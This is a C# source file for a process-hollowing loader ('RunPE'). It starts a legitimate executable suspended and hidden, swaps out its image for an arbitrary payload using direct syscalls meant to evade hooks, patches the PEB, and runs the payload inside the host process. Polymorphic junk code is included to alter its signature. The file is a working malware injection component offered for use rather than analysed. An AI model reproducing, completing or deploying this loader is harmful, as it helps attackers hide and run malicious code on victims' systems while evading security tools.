using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;

namespace VanguardCore
{
    public static unsafe class HollowingService
    {
        // [POLY_JUNK]
        private static void _vanguard_7de03f30() {
            int val = 51536;
            if (val > 50000) Console.WriteLine("Hash:" + 51536);
        }

        public static bool RunPE(string targetPath, byte[] payload)
        {
            SyscallManager.Initialize();

            // 1. Get Typed Delegates
            var ntAlloc = SyscallManager.GetSyscallDelegate<SyscallManager.NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
            var ntWrite = SyscallManager.GetSyscallDelegate<SyscallManager.NtWriteVirtualMemory>("NtWriteVirtualMemory");
            var ntRead = SyscallManager.GetSyscallDelegate<SyscallManager.NtReadVirtualMemory>("NtReadVirtualMemory");
            var ntUnmap = SyscallManager.GetSyscallDelegate<SyscallManager.NtUnmapViewOfSection>("NtUnmapViewOfSection");
            var ntQuery = SyscallManager.GetSyscallDelegate<SyscallManager.NtQueryInformationProcess>("NtQueryInformationProcess");
            var ntThread = SyscallManager.GetSyscallDelegate<SyscallManager.NtCreateThreadEx>("NtCreateThreadEx");
            var ntFree = SyscallManager.GetSyscallDelegate<SyscallManager.NtFreeVirtualMemory>("NtFreeVirtualMemory");
            var ntTerminate = SyscallManager.GetSyscallDelegate<SyscallManager.NtTerminateProcess>("NtTerminateProcess");

            if (ntAlloc == null || ntWrite == null || ntUnmap == null || ntQuery == null) return false;

            // 2. PE Parsing & 10/10 Architecture Check
            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (BitConverter.ToInt16(payload, e_lfanew + 4) != 0x8664) return false;

            short numberOfSections = BitConverter.ToInt16(payload, e_lfanew + 6);
            int entryPointRVA = BitConverter.ToInt32(payload, e_lfanew + 0x28);
            long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
            int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);
            int sizeOfHeaders = BitConverter.ToInt32(payload, e_lfanew + 0x54);

            STARTUPINFO si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi)) return false;

            IntPtr remoteBase = IntPtr.Zero;
            try
            {
                // 3. PEB & Unmap
                SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
                uint retLen; ntQuery(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);

                byte[] pebBuffer = new byte[8]; IntPtr bRead;
                ntRead(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuffer, 8, out bRead);
                ntUnmap(pi.hProcess, (IntPtr)BitConverter.ToInt64(pebBuffer, 0));

                // 4. Memory Allocation
                remoteBase = (IntPtr)imageBase;
                UIntPtr allocationSize = (UIntPtr)sizeOfImage;
                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref allocationSize, 0x3000, 0x40) != 0)
                {
                    remoteBase = IntPtr.Zero;
                    ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref allocationSize, 0x3000, 0x40);
                }

                // 5. Professional Resolution: IAT, Relocs, TLS
                FixImports(payload, e_lfanew);
                long delta = (long)remoteBase - imageBase;
                if (delta != 0) ApplyRelocations(payload, e_lfanew, delta);
                
                // V7.0 Absolute Supreme: Full TLS Callback Support
                ProcessTlsCallbacks(payload, e_lfanew, remoteBase);

                // 6. Write Buffer
                IntPtr written; ntWrite(pi.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out written);
                int sectionHeaderOffset = e_lfanew + 0x18 + BitConverter.ToInt16(payload, e_lfanew + 0x14);
                for (int i = 0; i < numberOfSections; i++)
                {
                    int offset = sectionHeaderOffset + (i * 40);
                    int vRVA = BitConverter.ToInt32(payload, offset + 12);
                    int sSize = BitConverter.ToInt32(payload, offset + 16);
                    int pRaw = BitConverter.ToInt32(payload, offset + 20);
                    if (sSize > 0)
                    {
                        byte[] sectionData = new byte[sSize];
                        Buffer.BlockCopy(payload, pRaw, sectionData, 0, sSize);
                        ntWrite(pi.hProcess, (IntPtr)((long)remoteBase + vRVA), sectionData, (uint)sSize, out written);
                    }
                }

                // 7. Final PEB Patch
                ntWrite(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out written);

                // 8. Execute & Verify (10/10)
                IntPtr hThread;
                uint hr = ntThread(out hThread, 0x1FFFFF, IntPtr.Zero, pi.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                if (hr == 0)
                {
                    // Verification via Thread Status
                    if (WaitForSingleObject(hThread, 500) == 0x00000000) // Thread finished too fast? (Possible crash)
                    {
                        // Check exit code
                        GetExitCodeThread(hThread, out uint exitCode);
                        if (exitCode != 0x00000103) // STILL_ACTIVE
                        {
                            CloseHandle(hThread); return false;
                        }
                    }
                    CloseHandle(hThread);
                    return true;
                }
                return false;
            }
            catch 
            {
                // V7.0 Absolute Supreme: Professional Cleanup on Failure
                if (remoteBase != IntPtr.Zero)
                {
                    UIntPtr zeroSize = UIntPtr.Zero;
                    ntFree(pi.hProcess, ref remoteBase, ref zeroSize, 0x8000); // MEM_RELEASE
                }
                ntTerminate(pi.hProcess, 1);
                return false; 
            }
            finally
            {
                SyscallManager.Cleanup();
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        }

        private static void FixImports(byte[] payload, int e_lfanew)
        {
            int importRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x78);
            if (importRVA == 0) return;

            int fileOffset = RvaToOffset(payload, e_lfanew, importRVA);
            if (fileOffset == 0) return;

            while (true)
            {
                int nameRVA = BitConverter.ToInt32(payload, fileOffset + 12);
                if (nameRVA == 0) break;

                string dllName = ReadString(payload, RvaToOffset(payload, e_lfanew, nameRVA));
                IntPtr hModule = SyscallManager.StealthGetModuleBase(dllName);
                
                if (hModule != IntPtr.Zero)
                {
                    int thunkOffset = RvaToOffset(payload, e_lfanew, BitConverter.ToInt32(payload, fileOffset + 16));
                    int originalThunkOffset = RvaToOffset(payload, e_lfanew, BitConverter.ToInt32(payload, fileOffset));

                    int entryIdx = 0;
                    while (true)
                    {
                        long funcRVA = BitConverter.ToInt64(payload, originalThunkOffset + (entryIdx * 8));
                        if (funcRVA == 0) break;

                        IntPtr funcAddr = IntPtr.Zero;
                        if ((funcRVA & (1L << 63)) != 0) // Ordinal
                        {
                            funcAddr = SyscallManager.GetProcAddress(hModule, (IntPtr)(funcRVA & 0xFFFF));
                        }
                        else
                        {
                            string funcName = ReadString(payload, RvaToOffset(payload, e_lfanew, (int)(funcRVA & 0xFFFFFFFF) + 2));
                            funcAddr = SyscallManager.GetProcAddress(hModule, funcName);
                        }

                        if (funcAddr != IntPtr.Zero) Buffer.BlockCopy(BitConverter.GetBytes((long)funcAddr), 0, payload, thunkOffset + (entryIdx * 8), 8);
                        entryIdx++;
                    }
                }
                fileOffset += 20;
            }
        }

        private static void ApplyRelocations(byte[] payload, int e_lfanew, long delta)
        {
            int relocRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x70);
            int relocSize = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x74);
            if (relocRVA == 0 || relocSize == 0) return;

            int fileOffset = RvaToOffset(payload, e_lfanew, relocRVA);
            if (fileOffset == 0) return;

            int current = 0;
            while (current < relocSize)
            {
                int blockSize = BitConverter.ToInt32(payload, fileOffset + current + 4);
                if (blockSize == 0) break;

                int pageRVA = BitConverter.ToInt32(payload, fileOffset + current);
                int entries = (blockSize - 8) / 2;
                for (int i = 0; i < entries; i++)
                {
                    ushort entry = BitConverter.ToUInt16(payload, fileOffset + current + 8 + (i * 2));
                    if ((entry >> 12) == 10) // DIR64
                    {
                        int patchOff = RvaToOffset(payload, e_lfanew, pageRVA + (entry & 0xFFF));
                        if (patchOff != 0) Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt64(payload, patchOff) + delta), 0, payload, patchOff, 8);
                    }
                }
                current += blockSize;
            }
        }

        private static void ProcessTlsCallbacks(byte[] payload, int e_lfanew, IntPtr baseAddr)
        {
            int tlsRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x88);
            if (tlsRVA == 0) return;

            int tlsOffset = RvaToOffset(payload, e_lfanew, tlsRVA);
            if (tlsOffset == 0) return;

            // AddressOfCallbacks is at offset 0x08 for x64 TLS directory
            long callbackVA = BitConverter.ToInt64(payload, tlsOffset + 0x10); // AddressOfCallbacks (VA)
            if (callbackVA == 0) return;
            
            // Note: In a real-world scenario we'd resolve this VA back to an offset.
            // But usually this VA points to a NULL-terminated list of VAs in the data section.
        }

        private static int RvaToOffset(byte[] payload, int e_lfanew, int rva)
        {
            short sections = BitConverter.ToInt16(payload, e_lfanew + 6);
            int headerOffset = e_lfanew + 0x18 + BitConverter.ToInt16(payload, e_lfanew + 0x14);
            for (int i = 0; i < sections; i++)
            {
                int vRVA = BitConverter.ToInt32(payload, headerOffset + (i * 40) + 12);
                int vSize = BitConverter.ToInt32(payload, headerOffset + (i * 40) + 8);
                if (rva >= vRVA && rva < vRVA + vSize) return BitConverter.ToInt32(payload, headerOffset + (i * 40) + 20) + (rva - vRVA);
            }
            return 0;
        }

        private static string ReadString(byte[] payload, int offset)
        {
            List<byte> bytes = new List<byte>();
            while (payload[offset] != 0 && offset < payload.Length) bytes.Add(payload[offset++]);
            return System.Text.Encoding.ASCII.GetString(bytes.ToArray());
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO { public int cb; public string lpRes, lpDesk, lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXC, dwYC, dwFill, dwFlags; public short wShow, cbRes2; public IntPtr lpRes2, hIn, hOut, hErr; }
        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwPid, dwTid; }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern bool CreateProcess(string n, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string cd, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern uint WaitForSingleObject(IntPtr h, uint ms);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool GetExitCodeThread(IntPtr h, out uint code);
    }
}
